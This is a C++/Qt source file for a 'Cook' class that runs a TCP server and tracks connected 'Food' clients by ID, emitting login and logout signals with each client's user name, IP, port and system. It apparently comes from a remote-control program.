#include "cook.h"

Cook::Cook(QObject *parent) : QObject(parent)
{
    // 初始化服务器
    mServer = new TcpServer(this);
    connect(mServer, SIGNAL(newConnection(QTcpSocket*)), this, SLOT(newConnection(QTcpSocket*)));
}

void Cook::start(int port)
{
    mServer->start(port);
}

void Cook::stop()
{
    mServer->stop();

    // 清除所有客户
    QHash<int , Food*> foods = mFoods;
    foreach(int id, foods.keys()) {
        foods[id]->closeAndDelete();
    }
    mFoods.clear();
}

int Cook::generateId()
{
    const int max = 1 << 30;

    // 生成不重复的id 之前用过但是下线了的id可以重用
    QList<int> existsKeys = mFoods.keys();
    for (int i=mFoods.size()+1; i<max; ++i) {
        if (existsKeys.indexOf(i) == -1) {
            return i;
        }
    }

    return -1;
}

void Cook::newConnection(QTcpSocket *sock)
{
    // 创建ZeroClient，把sock添加进去
    Food *food = new Food(sock);
    connect(food, SIGNAL(login(Food*,QString,QString,int,QString)),
            this, SLOT(login(Food*,QString,QString,int,QString)));
    connect(food, SIGNAL(logout(int)), this, SLOT(logout(int)));
}

void Cook::login(Food *client, QString userName, QString ip, int port, QString system)
{
    // 增加客户到哈希表
    int id = generateId();
    mFoods.insert(id, client);
    client->setId(id);

    // 发射登入信号给窗口控件
    emit foodLogin(id, userName, ip, port, system);
}

void Cook::logout(int id)
{
    // 从哈希表中删除客户
    mFoods.remove(id);

    // 发射登出信号给窗口控件
    emit foodLogout(id);
}
